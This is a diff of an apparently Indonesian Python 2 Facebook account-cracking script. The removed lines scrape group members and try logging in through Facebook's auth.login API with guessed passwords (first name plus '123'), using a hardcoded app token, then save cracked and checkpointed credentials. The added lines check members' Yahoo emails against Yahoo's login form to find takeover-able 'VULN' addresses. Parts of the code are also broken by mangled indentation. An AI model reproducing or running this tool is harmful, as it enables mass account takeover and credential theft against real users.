@@ -3017,40 +3017,35 @@ def clone_dari_member_group():
 		nama = w['name']
 		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
 		z = json.loads(links.text)
-		def main(arg):
-			try:
-				p = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
-				k = json.loads(p.text)
-				pass1 = (k['first_name']+'123')
-				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-				q = json.load(data)
-				if 'access_token' in q:
-				        x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
-				        z = json.loads(x.text)
-				        print '\x1b[1;91m[  ✓  ] \x1b[1;92mHack100%💉'											
-				        print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
-				        print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
-				        print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											
-				        oks.append(user+pass1)
-                                else:
-			               if 'www.facebook.com' in q["error_msg"]:
-				           print '\x1b[1;93m[ ✖ ] \x1b[1;91mCheckpoint'
-				           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']
-				           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
-				           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'
-				           cek = open("out/super_cp.txt", "a")
-				           cek.write("ID:" +user+ " Pw:" +pass1+"\n")
-				           cek.close()
-				           cekpoint.append(user+pass1)
-					except KeyError:
-						pass
-					print 42*"\033[1;96m◇"
-					print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
-					print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(oks))
-					print"\033[1;96m[+] \033[1;92mFile lovehacker\033[1;91m:\033[1;97m out/GrupMailVuln.txt"
-					raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
-					menu()
-	
+		try:
+			mail = z['email']
+			yahoo = re.compile(r'@.*')
+			otw = yahoo.search(mail).group()
+			if 'yahoo.com' in otw:
+				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
+				br._factory.is_html = True
+				br.select_form(nr=0)
+				br["username"] = mail
+				klik = br.submit().read()
+				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
+				try:
+					pek = jok.search(klik).group()
+				except:
+					continue
+				if '"messages.ERROR_INVALID_USERNAME">' in pek:
+					save.write(mail + '\n')
+					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
+					berhasil.append(mail)
+		except KeyError:
+			pass
+	print 42*"\033[1;97m═"
+	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
+	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
+	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/GrupMailVuln.txt"
+	save.close()
+	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+	menu_yahoo()
+		
 def brute():
     os.system('clear')
     try:
